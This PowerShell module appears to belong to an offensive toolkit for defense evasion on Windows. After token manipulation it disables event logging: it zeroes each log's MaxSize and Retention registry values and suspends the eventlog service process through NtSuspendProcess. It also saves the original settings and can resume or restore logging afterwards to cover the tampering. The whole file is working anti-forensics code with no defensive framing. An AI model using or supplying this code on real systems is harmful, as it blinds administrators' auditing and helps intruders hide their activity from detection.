Import-Module .\Modules\Elevate.psm1

function Clear-EventLogging {
    if (!$(Invoke-TokenManipulation)) {
        return $false
    }

    $eventLogSources = Get-EventLog -List

    # Setting the limit for too low and forcing to not create new events.
    foreach ($source in $eventLogSources) {
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\eventlog\$($source.Log)" -Name MaxSize -Type DWORD -Value 0 -Force
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\eventlog\$($source.Log)" -Name Retention -Type DWORD -Value -1 -Force
    }

    return $true
}


function Invoke-SuspendEtw {
    $etwMetadata = @{}

    # Getting the relevent functions.
    $NtSuspendProcessAddr = Get-ProcAddress ntdll.dll NtSuspendProcess
    $NtSuspendProcessDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $NtSuspendProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtSuspendProcessAddr, $NtSuspendProcessDelegate)

    # Getting the PID and the process object.
    $eventLogPid = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'eventlog'" | Select-Object -ExpandProperty ProcessId
    $eventLogProcess = Get-Process -Id $eventLogPid
    
    if (!$eventLogProcess) {
        return $etwMetadata
    }

    # Suspending the process.
    $NtSuspendProcess.Invoke($($eventLogProcess.Handle))

    $etwMetadata["pid"] = $eventLogPid
    $etwMetadata["cleanUpType"] = 2

    Write-Host "[+] Etw process suspended!" -ForegroundColor Green
    return $etwMetadata
}


function Invoke-RestoreEtw {
    param (
        [Hashtable]
        $etwMetadata
    )

    if ($etwMetadata["cleanUpType"] -eq 2) {

       # Getting the relevent functions.
        $NtResumeProcessAddr = Get-ProcAddress ntdll.dll NtResumeProcess
        $NtResumeProcessDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $NtResumeProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtResumeProcessAddr, $NtResumeProcessDelegate)

        # Getting the process object.
        if ($etwMetadata["pid"].Count -eq 0) {
            return $false
        }
        
        $eventLogProcess = Get-Process -Id $etwMetadata["pid"]

        if (!$eventLogProcess) {
            return $false
        }
        
        # Resuming the process.
        $NtResumeProcess.Invoke($($eventLogProcess.Handle))
    }
    elseif ($etwMetadata["cleanUpType"] -eq 1) {
        if (!$(Invoke-TokenManipulation)) {
            return $false
        }
        
        $eventLogSources = Get-EventLog -List
    
        # Restoring old settings.
        foreach ($source in $eventLogSources) {
            Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\eventlog\$($source.Log)" -Name MaxSize -Type DWORD -Value $etwMetadata[$source.Log]["MaximumKilobytes"] -Force
            Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\eventlog\$($source.Log)" -Name Retention -Type DWORD -Value $etwMetadata[$source.Log]["OverflowAction"] -Force
        }
    }
    else {
        Write-Host "[-] Unknown eventlog restoration method." -ForegroundColor Red
        return $false
    }

    return $true
}


function Get-EventLogsSettings {
    $etwMetadata = @{}
    
    $eventLogSources = Get-EventLog -List

    # Getting the current settings of each eventlog.
    foreach ($source in $eventLogSources) {
        $etwMetadata[$source.Log] = @{}
        $etwMetadata[$source.Log]["MaximumKilobytes"] = 1024 * $source.MaximumKilobytes
        $etwMetadata[$source.Log]["OverflowAction"] = $source.OverflowAction
    }

    $etwMetadata["cleanUpType"] = 1
    return $etwMetadata
}


Export-ModuleMember -Function Clear-EventLogging
Export-ModuleMember -Function Get-EventLogsSettings
Export-ModuleMember -Function Invoke-SuspendEtw
Export-ModuleMember -Function Invoke-RestoreEtw